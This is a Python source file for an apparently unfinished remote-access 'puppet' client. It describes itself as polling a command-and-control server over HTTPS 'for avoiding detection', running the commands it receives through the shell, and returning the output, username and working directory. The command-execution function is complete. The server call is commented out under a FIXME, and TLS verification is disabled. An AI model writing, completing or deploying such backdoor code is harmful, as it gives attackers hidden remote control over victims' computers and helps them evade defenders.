#!/usr/bin/env python3
import os
import sys
from datetime import datetime
from subprocess import getoutput as execute

from requests import Session
from urllib3 import disable_warnings

disable_warnings()
DEFAULT_SERVER_PORT = 443


def get_arguments():
    from argparse import ArgumentParser
    parser = ArgumentParser(description="Polls the CNC server, receives the commands from there, "
                                        "executes them and sends back the results. "
                                        "The client and the server use HTTPS for avoiding detection.")
    parser.add_argument('--server-address',
                        dest='server_address',
                        required=True,
                        type=str,
                        help='Specify an IP address or a domain name of the server '
                             'that receives the data stream from the puppet')
    parser.add_argument('--server-port',
                        dest='server_port',
                        required=False,
                        default=DEFAULT_SERVER_PORT,
                        type=int,
                        help='Specify the server port. '
                             f'{DEFAULT_SERVER_PORT}/tcp is set by default.')
    options = parser.parse_args()
    return options


def execute_command(command, current_work_dir=None):
    try:
        command_as_array = command.split(' ')
        if 'cd' == command_as_array[0] and len(command_as_array) == 2:
            os.chdir(command_as_array[1])
            result = ''
        else:
            if current_work_dir:
                os.chdir(current_work_dir)
            result = execute(command)
    except Exception as e:
        result = str(e)
    encoding = sys.getdefaultencoding()
    user = os.getlogin()
    current_work_dir = os.getcwd()
    if isinstance(result, bytes):
        result = result.decode(encoding, 'ignore')
    return {
        "user": user,
        "pwd": current_work_dir,
        "system_encoding": encoding,
        "data": result
    }


def communicate(event):
    session_id = ''
    now = datetime.now()
    with Session() as session:
        def poll_cnc_server(session_id):
            if session_id:
                session.headers['Session-ID'] = session_id

            # FIXME get the command, execute it and return the results
            # resp = session.post(f"{server_base_url}/communicate",
            #                     json={
            #                         'creation_timestamp': now.strftime("%m/%d/%Y, %H:%M:%S"),
            #                         'system_encoding': sys.getdefaultencoding(),
            #                         'username': os.getlogin(),
            #                         'pwd': os.getcwd(),
            #                         '': normalize_event(event)
            #                     },
            #                     verify=False)

        while True:
            try:
                poll_cnc_server(session_id)
            except Exception as e:
                print(e)


options = get_arguments()
server_base_url = f"https://{options.server_address}:{options.server_port}"
